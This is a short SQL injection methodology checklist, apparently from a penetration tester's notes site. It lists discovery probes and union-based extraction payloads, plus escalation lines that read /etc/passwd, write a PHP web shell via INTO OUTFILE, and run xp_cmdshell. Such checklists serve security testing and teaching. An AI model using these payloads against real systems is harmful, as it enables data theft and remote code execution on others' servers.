---
title: "SQL Injection (SQLi)"
tags: [methodology, sqli]
summary: "SQL injection discovery and exploitation — error-based, boolean, time-based, union-based attacks, and escalation to file read/shell write/RCE."
draft: false
---

## 1. Discovery
- [ ] Map all entry points (URL params, headers, forms, JSON).
- [ ] Submit `'`, `"`, `\`, `/*` to induce syntax errors.
- [ ] Test boolean behavior: `' OR 1=1--` vs `' OR 1=2--`.
- [ ] Test time delays: `' OR SLEEP(5)--`.

## 2. Exploitation (Union-Based)
- [ ] Find column count using `ORDER BY 1, 2, 3...`
- [ ] Output test data: `UNION SELECT 1,2,3...`
- [ ] Extract database user/version: `UNION SELECT user(), @@version`
- [ ] Extract tables: `UNION SELECT table_name, null FROM information_schema.tables`

## 3. Escalation
- [ ] Read local files (MySQL): `LOAD_FILE('/etc/passwd')`
- [ ] Write shell (MySQL): `INTO OUTFILE '/var/www/html/shell.php'`
- [ ] Command Execution (MSSQL): `xp_cmdshell 'whoami'`
